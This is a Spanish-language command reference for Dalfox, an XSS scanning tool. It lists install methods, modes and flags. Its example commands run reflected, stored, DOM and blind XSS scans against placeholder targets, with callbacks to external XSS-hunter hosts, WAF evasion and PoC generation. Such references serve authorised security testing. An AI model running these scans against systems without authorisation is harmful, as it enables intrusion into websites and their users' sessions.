# Dalfox - Referencia

Scanner y analizador de XSS rapido en Go. Soporta reflected, stored, DOM y blind XSS con integracion de pipeline.

## Instalacion

```bash
go install github.com/hahwul/dalfox/v2@latest
brew install dalfox          # macOS
sudo snap install dalfox     # Snap
docker pull hahwul/dalfox    # Docker
```

## Modos

| Modo | Descripcion |
|------|-------------|
| `url` | Escanear URL unica |
| `file` | URLs desde archivo |
| `pipe` | URLs desde stdin |
| `sxss` | Testing de Stored XSS |
| `server` | API REST server |
| `payload` | Generacion/encoding de payloads |

## Flags

### Target y Request
| Flag | Descripcion |
|------|-------------|
| `-b, --blind URL` | URL callback de blind XSS |
| `-d, --data STRING` | POST body data |
| `-H, --header STRING` | Header custom (repetible) |
| `-C, --cookie STRING` | Cookies |
| `-p, --param STRING` | Parametro(s) a probar (repetible) |
| `--request-method METHOD` | Forzar metodo HTTP |
| `--proxy URL` | Proxy (ej: `http://127.0.0.1:8080`) |
| `--follow-redirects` | Seguir redirects |
| `--timeout INT` | Timeout en segundos |
| `--delay INT` | Delay en ms entre requests |
| `-w, --worker INT` | Workers concurrentes |

### Payloads y Testing
| Flag | Descripcion |
|------|-------------|
| `--custom-payload FILE` | Payloads XSS custom |
| `--custom-blind-xss-payload FILE` | Payloads blind XSS custom |
| `--only-custom-payload` | Solo probar payloads custom |
| `--remote-payloads SOURCES` | Payloads remotos (portswigger, payloadbox) |
| `--deep-domxss` | DOM XSS profundo (mas lento) |
| `--waf-evasion` | Evasion de WAF via requests lentas |

### Discovery
| Flag | Descripcion |
|------|-------------|
| `--only-discovery` | Solo analisis de parametros (sin XSS testing) |
| `--skip-discovery` | Saltar fase de discovery |
| `--skip-mining-all` | Saltar mining de parametros |
| `--skip-mining-dom` | Saltar mining DOM |
| `--mining-dict FILE` | Diccionario para mining |

### Output
| Flag | Descripcion |
|------|-------------|
| `-o, --output FILE` | Archivo de salida |
| `--format FORMAT` | Formato: plain, json |
| `--output-all` | Escribir todos los logs |
| `--output-request` | Incluir HTTP requests |
| `--output-response` | Incluir HTTP responses |
| `--poc-type FORMAT` | Formato PoC: plain, curl, httpie, http-request |

### SXSS (Stored XSS)
| Flag | Descripcion |
|------|-------------|
| `--trigger URL` | URL para verificar despues de inyectar |

## Ejemplos Practicos

```bash
# URL unica
dalfox url "https://target.com/search?q=test"

# POST data
dalfox url "https://target.com/form" -d "username=test&password=test"

# Blind XSS con callback
dalfox url "https://target.com/contact" -b "https://your-xsshunter.xss.ht"

# Headers y cookies
dalfox url "https://target.com/dashboard?input=test" \
  -H "Authorization: Bearer eyJ..." -C "session=abc123"

# Parametros especificos
dalfox url "https://target.com/page?a=1&b=2&c=3" -p a -p c

# Desde archivo con workers
dalfox file urls.txt -w 50 -o results.txt

# Pipeline
cat urls.txt | dalfox pipe
echo "https://target.com/search?q=test" | dalfox pipe

# Pipe desde gau/subfinder
gau target.com | grep "=" | dalfox pipe -b "https://callback.xss.ht"

# Stored XSS
dalfox sxss "https://target.com/comment" -d "body=INJECT_HERE" \
  --trigger "https://target.com/view/comments"

# Via proxy
dalfox url "https://target.com/search?q=test" --proxy "http://127.0.0.1:8080"

# Solo payloads custom
dalfox url "https://target.com/search?q=test" \
  --custom-payload payloads.txt --only-custom-payload

# Payloads remotos de portswigger
dalfox url "https://target.com/search?q=test" --remote-payloads portswigger

# Solo discovery (sin explotacion)
dalfox url "https://target.com/page?x=1" --only-discovery

# Deep DOM XSS + WAF evasion
dalfox url "https://target.com/search?q=test" --deep-domxss --waf-evasion

# PoC en formato curl
dalfox url "https://target.com/search?q=test" --poc-type curl -o pocs.txt

# JSON completo
dalfox url "https://target.com/search?q=test" --format json \
  --output-all --output-request --output-response -o scan.json

# Rate limited
dalfox url "https://target.com/search?q=test" --delay 500 -w 3
```
